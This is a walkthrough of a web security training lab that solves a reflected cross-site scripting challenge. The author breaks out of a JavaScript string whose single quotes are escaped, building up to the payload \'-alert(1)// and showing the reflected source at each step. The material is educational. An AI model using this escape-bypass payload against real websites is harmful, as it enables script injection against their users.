# Description

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

# Solution

As always, let's check where our input goes by writing test.

```python
 <script>
  var searchTerms = 'test';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
We can see that our input will enter the function, and the first thing we will try to do is exit this function. 

If we enter our payload `' alert(123)`

```python
<script>
 var searchTerms = '\' alert(123)';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

And we can see that our quotation mark was escaped in the task description, which stated that most of these characters were escaped, so let's try to escape \ with the same character.

```python
\'-alert(123)
```

```python
<script>
  var searchTerms = '\\'-alert(1)';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
We almost managed to escape the function, we just need to shield ';
Using double slashes //

```python
\'-alert(1)//
```
And this is what our source code looks like

```python
<script>
  var searchTerms = '\\'-alert(1)//';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
